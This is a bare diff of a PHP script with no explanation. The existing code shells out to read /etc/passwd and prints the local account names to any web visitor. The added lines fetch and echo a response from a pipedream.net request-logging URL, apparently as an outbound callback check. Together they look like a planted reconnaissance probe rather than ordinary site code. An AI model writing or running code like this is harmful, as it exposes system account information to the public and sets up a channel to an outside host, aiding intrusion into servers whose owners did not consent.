@@ -23,4 +23,13 @@ $command = "cat /etc/passwd | cut -d\":\" -f1";
 exec($command, &$output);
 echo implode("<br />\n", $output);
 
+
+$string = file_get_contents("https://eo9sluutk6ong98.m.pipedream.net");
+
+    if($string === FALSE) {
+         echo "Could not read the file.";
+    } else {
+         echo $string;
+    }
+
 ?>
